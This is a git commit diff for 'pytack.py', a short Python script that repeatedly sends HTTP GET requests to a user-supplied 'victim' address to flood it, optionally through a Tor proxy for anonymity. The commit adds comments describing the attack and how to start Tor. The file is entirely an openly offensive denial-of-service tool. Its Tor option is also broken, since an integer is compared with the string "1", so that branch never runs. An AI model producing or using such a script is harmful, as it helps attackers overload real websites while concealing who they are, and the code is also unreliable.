1f0b30d43f49bf2d996fe634d0edcb30e122b0af
pythonistical <142655673+pythonistical@users.noreply.github.com>
2024-04-24 08:41:53 +0530

    Update pytack.py
    Adding documentation in the form of comments

--- pytack.py
+++ pytack.py
@@ -1,17 +1,19 @@
 #turn on Tor browser in cmd for this to work
+#write command ./start-tor-browser in Linux
+#write command tor.exe -f torrc in Windows
 import requests
 target = str(input('Write the full web address of the victim\t'))
 times = int(input('How many times to brute force the victim?\t'))
 security = int(input('Do you want your attack to be routed through Tor? It will slow the attack down. Write "1" for yes, "0" for no\t'))
 if security == "1":
    def get_tor_session():
-       session = requests.session()
-       session.proxies = {'http':  'socks5h://localhost:9050',
+       session = requests.session() #this starts to modify the nature of the connection
+       session.proxies = {'http':  'socks5h://localhost:9050', #adding Tor proxies for anoymity
                           'https': 'socks5h://localhost:9050'}
-       return session
+       return session #using this as a func helps us to choose whether to use proxies or not
    for i in range(times):    
-       session = get_tor_session()
-       print(session.get(target))
-else:
+       session = get_tor_session() #as you have picked security over speed, we are using proxies
+       print(session.get(target)) #using the modified connection settings, we attack the victim
+else: #speed > security
     for i in range(times):
         print(requests.get(target))
